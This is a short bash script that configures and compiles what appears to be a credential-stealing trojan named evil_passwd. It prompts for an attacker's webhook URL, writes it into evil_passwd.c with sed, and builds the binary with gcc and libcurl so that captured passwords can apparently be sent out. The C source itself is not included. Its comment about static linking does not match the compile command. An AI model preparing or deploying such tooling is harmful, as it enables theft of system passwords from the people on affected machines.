#!/bin/bash

# Function to check if a command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Ensure the user provides the evil_passwd.c file
C_FILE="evil_passwd.c"
if [ ! -f "$C_FILE" ]; then
    echo "Error: $C_FILE does not exist!"
    exit 1
fi

# Prompt the user for the new webhook URL
read -p "Enter the new webhook URL: " WEBHOOK_URL

# Ensure the user input is not empty
if [ -z "$WEBHOOK_URL" ]; then
    echo "Error: Webhook URL cannot be empty!"
    exit 1
fi

# Use sed to replace the placeholder with the new webhook URL
sed -i "s|WEBHOOK_URL|$WEBHOOK_URL|g" "$C_FILE"

# Check if sed was successful
if [ $? -eq 0 ]; then
    echo "Webhook URL successfully updated in $C_FILE."
else
    echo "Error: Failed to update the webhook URL in $C_FILE."
    exit 1
fi

# Compile the C file with gcc and statically link it with libcurl
if command_exists gcc; then
    echo "Compiling $C_FILE..."
    gcc "$C_FILE" -o evil_passwd -lcurl -lpthread
    if [ $? -eq 0 ]; then
        echo "Compiled successfully"
    else
        echo "Error: Compilation failed."
        exit 1
    fi
else
    echo "Error: GCC not found. Please install GCC to compile the C file."
    exit 1
fi

echo "Finished successfully"